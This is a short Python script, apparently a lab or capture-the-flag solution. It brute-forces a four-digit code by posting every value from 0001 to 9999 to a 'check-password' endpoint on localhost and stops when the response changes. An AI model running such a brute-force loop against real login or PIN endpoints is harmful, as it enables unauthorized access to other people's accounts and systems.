import requests

for i in range(1, 10000):
  code = str(i).zfill(4)
  url = f"http://localhost:9002/check-password"
  data = {"code": code}

  response = requests.post(url, data=data)

  print(f'{code} : {response.text}')
  if len(response.text) != 48:
    break
